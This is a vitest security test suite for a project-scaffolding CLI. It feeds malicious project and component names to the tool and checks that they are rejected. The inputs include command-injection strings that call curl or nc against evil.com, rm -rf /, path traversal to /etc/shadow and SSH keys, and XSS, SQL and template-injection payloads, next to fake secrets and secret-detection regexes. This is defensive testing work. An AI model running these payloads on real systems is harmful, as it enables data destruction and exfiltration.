/**
 * Security and Compliance Tests for CLI
 *
 * Tests security vulnerabilities, input sanitization, secret leak detection,
 * and compliance with security standards like OWASP and NSM.
 */

import path from "node:path";
import { execa } from "execa";
import fs from "fs-extra";
import tmp from "tmp";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { testUtils } from "../test-helpers.js";

describe("CLI Security Tests", () => {
	let testDir: string;
	let originalCwd: string;
	let cleanup: () => void;
	let cliPath: string;

	beforeAll(async () => {
		cliPath = path.resolve(__dirname, "../../../dist/index.js");
		const exists = await fs.pathExists(cliPath);
		if (!exists) {
			throw new Error("CLI not built. Run 'npm run build' first.");
		}
	});

	beforeEach(async () => {
		originalCwd = process.cwd();

		// Create temporary test directory
		const result = tmp.dirSync({
			prefix: "xaheen-security-test-",
			unsafeCleanup: true,
		});
		testDir = result.name;
		cleanup = result.removeCallback;

		process.chdir(testDir);
	});

	afterEach(async () => {
		process.chdir(originalCwd);

		if (cleanup) {
			cleanup();
		}
	});

	describe("Input Sanitization", () => {
		it("should sanitize malicious project names", async () => {
			const maliciousNames = [
				"../../../etc/passwd",
				"project; rm -rf /",
				"project && curl evil.com",
				"project`whoami`",
				"project$(id)",
				"project\x00",
				"project\n\nrm -rf /",
				"<script>alert('xss')</script>",
				"'; DROP TABLE users; --",
				"project\r\nmalicious-command",
			];

			for (const maliciousName of maliciousNames) {
				const result = await execa(
					"node",
					[cliPath, "project", "create", maliciousName],
					{
						cwd: testDir,
						env: { XAHEEN_NO_BANNER: "true" },
						timeout: 15000,
						reject: false, // Don't throw on non-zero exit
					},
				);

				// Should reject malicious names
				expect(result.exitCode).toBe(1);
				expect(result.stderr).toContain("Invalid project name");

				// Verify no malicious directory was created
				const dangerousPath = path.resolve(testDir, maliciousName);
				const exists = await fs.pathExists(dangerousPath);
				expect(exists).toBe(false);
			}
		});

		it("should sanitize file paths to prevent directory traversal", async () => {
			const projectName = "security-test-project";

			// Create a legitimate project first
			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);
			process.chdir(projectPath);

			const maliciousPaths = [
				"../../../etc/passwd",
				"..\\..\\..\\windows\\system32\\config\\sam",
				"/etc/shadow",
				"C:\\Windows\\System32\\config\\SAM",
				"../../node_modules/.bin/malicious",
				"../../../.ssh/id_rsa",
			];

			for (const maliciousPath of maliciousPaths) {
				const result = await execa(
					"node",
					[cliPath, "make:component", maliciousPath],
					{
						cwd: projectPath,
						env: { XAHEEN_NO_BANNER: "true" },
						timeout: 10000,
						reject: false,
					},
				);

				// Should reject path traversal attempts
				expect(result.exitCode).toBe(1);
				expect(result.stderr).toContain("Invalid") ||
					expect(result.stderr).toContain("Error");
			}
		});

		it("should validate command line arguments", async () => {
			const invalidArguments = [
				["--config", "/etc/passwd"],
				["--output", "../../../etc/hosts"],
				["--template", "$(rm -rf /)"],
				["--env-file", "/etc/shadow"],
			];

			for (const [flag, value] of invalidArguments) {
				const result = await execa(
					"node",
					[cliPath, "project", "create", "test-project", flag, value],
					{
						cwd: testDir,
						env: { XAHEEN_NO_BANNER: "true" },
						timeout: 15000,
						reject: false,
					},
				);

				// Should validate and reject dangerous arguments
				expect(result.exitCode).toBe(1);
			}
		});
	});

	describe("Secret Detection", () => {
		it("should detect hardcoded secrets in generated code", async () => {
			const projectName = "secret-detection-test";

			// Create project
			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);

			// Create a file with potential secrets
			const configPath = path.join(projectPath, "src", "config.ts");
			await fs.ensureDir(path.dirname(configPath));
			await fs.writeFile(
				configPath,
				`
export const config = {
  apiKey: "sk-1234567890abcdef", // API key pattern
  password: "super-secret-password",
  token: "ghp_abcdefghijklmnopqrstuvwxyz123456", // GitHub token pattern
  awsAccessKey: "AKIAIOSFODNN7EXAMPLE",
  privateKey: "-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...",
  databaseUrl: "postgres://user:password@localhost:5432/db",
  jwtSecret: "jwt-super-secret-key-12345",
};
`,
			);

			// Run secret detection
			const secretPatterns = [
				/sk-[a-zA-Z0-9]{32,}/, // API keys
				/ghp_[a-zA-Z0-9]{36}/, // GitHub tokens
				/AKIA[0-9A-Z]{16}/, // AWS access keys
				/-----BEGIN [A-Z ]+-----/, // Private keys
				/jwt-[a-zA-Z0-9-]+/, // JWT secrets
				/password["\s]*[:=]["\s]*[a-zA-Z0-9-]+/i, // Password fields
			];

			const fileContent = await fs.readFile(configPath, "utf8");
			const detectedSecrets: string[] = [];

			for (const pattern of secretPatterns) {
				const matches = fileContent.match(pattern);
				if (matches) {
					detectedSecrets.push(matches[0]);
				}
			}

			// Should detect potential secrets
			expect(detectedSecrets.length).toBeGreaterThan(0);

			console.log("Detected potential secrets:", detectedSecrets);

			// In a real implementation, the CLI should warn about or prevent such secrets
			// For now, we just verify our detection works
		});

		it("should validate environment variable patterns", async () => {
			const projectName = "env-validation-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);

			// Create .env.example file
			const envExamplePath = path.join(projectPath, ".env.example");
			await fs.writeFile(
				envExamplePath,
				`
# Safe environment variables (examples)
DATABASE_URL=your_database_url_here
API_KEY=your_api_key_here
JWT_SECRET=your_jwt_secret_here
NEXT_PUBLIC_API_URL=https://api.example.com

# These should NOT appear in example files
DATABASE_URL=postgres://user:realpassword@localhost:5432/db
API_KEY=sk-1234567890abcdef
JWT_SECRET=actual-secret-key-12345
`,
			);

			const content = await fs.readFile(envExamplePath, "utf8");

			// Check for actual secrets in example files (security violation)
			const realSecretPatterns = [
				/DATABASE_URL=postgres:\/\/[^:]+:[^@]+@/, // Real database credentials
				/API_KEY=sk-[a-zA-Z0-9]+/, // Real API keys
				/JWT_SECRET=[a-zA-Z0-9-]{10,}/, // Real JWT secrets
			];

			const foundRealSecrets: string[] = [];
			for (const pattern of realSecretPatterns) {
				const matches = content.match(pattern);
				if (matches) {
					foundRealSecrets.push(matches[0]);
				}
			}

			// Should detect real secrets in example files (this is a security issue)
			expect(foundRealSecrets.length).toBeGreaterThan(0);

			console.log(
				"Found real secrets in example file (security violation):",
				foundRealSecrets,
			);
		});
	});

	describe("File System Security", () => {
		it("should prevent writing outside project directory", async () => {
			const projectName = "fs-security-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);
			process.chdir(projectPath);

			// Try to create component outside project directory
			const result = await execa(
				"node",
				[cliPath, "make:component", "../../../EvilComponent"],
				{
					cwd: projectPath,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 10000,
					reject: false,
				},
			);

			expect(result.exitCode).toBe(1);

			// Verify no file was created outside project
			const evilPath = path.resolve(testDir, "../../../EvilComponent.tsx");
			const exists = await fs.pathExists(evilPath);
			expect(exists).toBe(false);
		});

		it("should validate file permissions", async () => {
			const projectName = "permissions-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);

			// Check that generated files have appropriate permissions
			const filesToCheck = [
				path.join(projectPath, "package.json"),
				path.join(projectPath, "src", "index.ts"),
			];

			for (const filePath of filesToCheck) {
				if (await fs.pathExists(filePath)) {
					const stats = await fs.stat(filePath);
					const mode = stats.mode;

					// Files should be readable and writable by owner, readable by group/others
					// But not executable (unless they're meant to be)
					const isExecutable = (mode & parseInt("111", 8)) !== 0;
					const isReadableByOwner = (mode & parseInt("400", 8)) !== 0;
					const isWritableByOwner = (mode & parseInt("200", 8)) !== 0;

					expect(isReadableByOwner).toBe(true);
					expect(isWritableByOwner).toBe(true);

					// Regular source files should not be executable
					if (!filePath.includes("bin/") && !filePath.endsWith(".sh")) {
						expect(isExecutable).toBe(false);
					}
				}
			}
		});
	});

	describe("Dependency Security", () => {
		it("should check for known vulnerabilities in generated package.json", async () => {
			const projectName = "dependency-security-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"saas-starter",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);
			const packageJsonPath = path.join(projectPath, "package.json");

			const packageJson = await fs.readJson(packageJsonPath);

			// Check for known vulnerable packages (examples)
			const knownVulnerablePackages = [
				"event-stream", // Known malicious package
				"eslint-scope", // Had malicious version
				"flatmap-stream", // Dependency of event-stream
			];

			const dependencies = {
				...packageJson.dependencies,
				...packageJson.devDependencies,
			};

			const vulnerableFound = knownVulnerablePackages.filter((pkg) =>
				dependencies.hasOwnProperty(pkg),
			);

			// Should not include known vulnerable packages
			expect(vulnerableFound).toEqual([]);

			// Check for outdated major versions of critical packages
			const criticalPackages = {
				next: 14, // Should be version 14+
				react: 18, // Should be version 18+
				typescript: 5, // Should be version 5+
			};

			for (const [pkg, minMajorVersion] of Object.entries(criticalPackages)) {
				if (dependencies[pkg]) {
					const version = dependencies[pkg].replace(/[^0-9.].*/, ""); // Remove non-numeric suffixes
					const majorVersion = parseInt(version.split(".")[0]);

					expect(majorVersion).toBeGreaterThanOrEqual(minMajorVersion);
				}
			}
		});

		it("should validate package sources", async () => {
			const projectName = "package-source-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);
			const packageJsonPath = path.join(projectPath, "package.json");

			const packageJson = await fs.readJson(packageJsonPath);

			// Check for suspicious package sources
			const dependencies = {
				...packageJson.dependencies,
				...packageJson.devDependencies,
			};

			const suspiciousPatterns = [
				/github\.com\/[^\/]+\/[^\/]+#[a-f0-9]+/, // Direct git commits (can be risky)
				/^file:/, // Local file dependencies
				/^[a-zA-Z]+:\/\/(?!registry\.npmjs\.org)/, // Non-npm registries
			];

			const suspiciousDependencies: string[] = [];

			for (const [name, version] of Object.entries(dependencies)) {
				if (typeof version === "string") {
					for (const pattern of suspiciousPatterns) {
						if (pattern.test(version)) {
							suspiciousDependencies.push(`${name}: ${version}`);
						}
					}
				}
			}

			// Log suspicious dependencies for review
			if (suspiciousDependencies.length > 0) {
				console.log(
					"Suspicious dependency sources found:",
					suspiciousDependencies,
				);
			}

			// In most cases, should use npm registry
			expect(suspiciousDependencies.length).toBe(0);
		});
	});

	describe("Command Injection Prevention", () => {
		it("should prevent command injection in system calls", async () => {
			const projectName = "command-injection-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);
			process.chdir(projectPath);

			// Try command injection in component name
			const maliciousCommands = [
				"Component; rm -rf /",
				"Component && curl evil.com",
				"Component | nc evil.com 4444",
				"Component`whoami`",
				"Component$(id)",
				"Component\nrm -rf /",
			];

			for (const maliciousCommand of maliciousCommands) {
				const result = await execa(
					"node",
					[cliPath, "make:component", maliciousCommand],
					{
						cwd: projectPath,
						env: { XAHEEN_NO_BANNER: "true" },
						timeout: 10000,
						reject: false,
					},
				);

				// Should reject command injection attempts
				expect(result.exitCode).toBe(1);
				expect(result.stderr).toContain("Invalid") ||
					expect(result.stderr).toContain("Error");
			}
		});

		it("should sanitize template variables", async () => {
			const projectName = "template-injection-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);
			process.chdir(projectPath);

			// Try template injection
			const result = await execa(
				"node",
				[
					cliPath,
					"make:component",
					"TestComponent",
					"--description",
					"{{constructor.constructor('alert(1)')()}}",
				],
				{
					cwd: projectPath,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 15000,
					reject: false,
				},
			);

			// Command should either succeed with sanitized input or fail safely
			if (result.exitCode === 0) {
				// If successful, verify no code injection occurred
				const componentPath = path.join(
					projectPath,
					"src",
					"components",
					"TestComponent.tsx",
				);
				if (await fs.pathExists(componentPath)) {
					const content = await fs.readFile(componentPath, "utf8");

					// Should not contain executable code injection
					expect(content).not.toContain("constructor.constructor");
					expect(content).not.toContain("alert(1)");
				}
			}
		});
	});

	describe("Compliance Testing", () => {
		it("should generate GDPR-compliant code structures", async () => {
			const projectName = "gdpr-compliance-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"saas-starter",
					"--compliance",
					"gdpr",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
					reject: false, // May not support --compliance flag yet
				},
			);

			const projectPath = path.join(testDir, projectName);

			if (await fs.pathExists(projectPath)) {
				// Check for GDPR-related files and structures
				const gdprFiles = [
					"src/privacy/consent-manager.ts",
					"src/privacy/data-processor.ts",
					"src/components/CookieConsent.tsx",
					"docs/privacy-policy.md",
					"docs/data-processing-record.md",
				];

				let gdprFilesFound = 0;
				for (const filePath of gdprFiles) {
					const fullPath = path.join(projectPath, filePath);
					if (await fs.pathExists(fullPath)) {
						gdprFilesFound++;

						// Verify file contains GDPR-related content
						const content = await fs.readFile(fullPath, "utf8");
						expect(
							content.toLowerCase().includes("gdpr") ||
								content.toLowerCase().includes("consent") ||
								content.toLowerCase().includes("privacy") ||
								content.toLowerCase().includes("data protection"),
						).toBe(true);
					}
				}

				// Should have some GDPR-related structures
				// (Even if --compliance flag isn't implemented yet)
				console.log(
					`GDPR compliance files found: ${gdprFilesFound}/${gdprFiles.length}`,
				);
			}
		});

		it("should check Norwegian NSM compliance features", async () => {
			const projectName = "nsm-compliance-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"saas-enterprise",
					"--region",
					"norway",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
					reject: false,
				},
			);

			const projectPath = path.join(testDir, projectName);

			if (await fs.pathExists(projectPath)) {
				// Check for Norwegian compliance features
				const nsmFeatures = [
					"security classification",
					"audit logging",
					"data sovereignty",
					"encryption at rest",
					"access control",
				];

				const packageJsonPath = path.join(projectPath, "package.json");
				if (await fs.pathExists(packageJsonPath)) {
					const packageJson = await fs.readJson(packageJsonPath);

					// Check for security-related dependencies
					const securityDeps = {
						...packageJson.dependencies,
						...packageJson.devDependencies,
					};

					const securityPackages = [
						"helmet", // Security headers
						"bcrypt", // Password hashing
						"jsonwebtoken", // JWT handling
						"express-rate-limit", // Rate limiting
						"cors", // CORS handling
					];

					let securityPackagesFound = 0;
					for (const pkg of securityPackages) {
						if (securityDeps[pkg]) {
							securityPackagesFound++;
						}
					}

					console.log(
						`Security packages found: ${securityPackagesFound}/${securityPackages.length}`,
					);

					// Should include some security packages
					expect(securityPackagesFound).toBeGreaterThan(0);
				}
			}
		});

		it("should validate accessibility compliance", async () => {
			const projectName = "accessibility-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);
			process.chdir(projectPath);

			// Generate a component and check accessibility
			await execa(
				"node",
				[
					cliPath,
					"make:component",
					"AccessibleButton",
					"--accessibility",
					"AAA",
				],
				{
					cwd: projectPath,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 15000,
					reject: false,
				},
			);

			const componentPath = path.join(
				projectPath,
				"src",
				"components",
				"AccessibleButton.tsx",
			);

			if (await fs.pathExists(componentPath)) {
				const content = await fs.readFile(componentPath, "utf8");

				// Check for accessibility attributes
				const accessibilityFeatures = [
					"aria-label",
					"aria-describedby",
					"aria-expanded",
					"role=",
					"tabIndex",
					"onKeyDown",
					"focus:",
				];

				let accessibilityFeaturesFound = 0;
				for (const feature of accessibilityFeatures) {
					if (content.includes(feature)) {
						accessibilityFeaturesFound++;
					}
				}

				console.log(
					`Accessibility features found: ${accessibilityFeaturesFound}/${accessibilityFeatures.length}`,
				);

				// Should include accessibility features
				expect(accessibilityFeaturesFound).toBeGreaterThan(0);
			}
		});
	});

	describe("Security Audit Integration", () => {
		it("should run npm audit equivalent checks", async () => {
			const projectName = "audit-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);

			// Try to run security audit command
			const auditResult = await execa(
				"node",
				[
					cliPath,
					"security-audit",
					"--tools",
					"npm-audit",
					"--severity",
					"high",
				],
				{
					cwd: projectPath,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
					reject: false,
				},
			);

			// Command should exist and run (may fail due to missing dependencies)
			expect([0, 1]).toContain(auditResult.exitCode);

			// Should mention audit or security in output
			const output = auditResult.stdout + auditResult.stderr;
			expect(
				output.toLowerCase().includes("audit") ||
					output.toLowerCase().includes("security") ||
					output.toLowerCase().includes("vulnerability"),
			).toBe(true);
		});

		it("should generate compliance reports", async () => {
			const projectName = "compliance-report-test";

			await execa(
				"node",
				[
					cliPath,
					"project",
					"create",
					projectName,
					"--preset",
					"simple",
					"--skip-install",
				],
				{
					cwd: testDir,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
				},
			);

			const projectPath = path.join(testDir, projectName);

			// Try to generate compliance report
			const reportResult = await execa(
				"node",
				[
					cliPath,
					"compliance-report",
					"--standards",
					"owasp,gdpr",
					"--format",
					"json",
				],
				{
					cwd: projectPath,
					env: { XAHEEN_NO_BANNER: "true" },
					timeout: 30000,
					reject: false,
				},
			);

			// Command should exist and run
			expect([0, 1]).toContain(reportResult.exitCode);

			// Should mention compliance or standards in output
			const output = reportResult.stdout + reportResult.stderr;
			expect(
				output.toLowerCase().includes("compliance") ||
					output.toLowerCase().includes("report") ||
					output.toLowerCase().includes("owasp") ||
					output.toLowerCase().includes("gdpr"),
			).toBe(true);
		});
	});
});
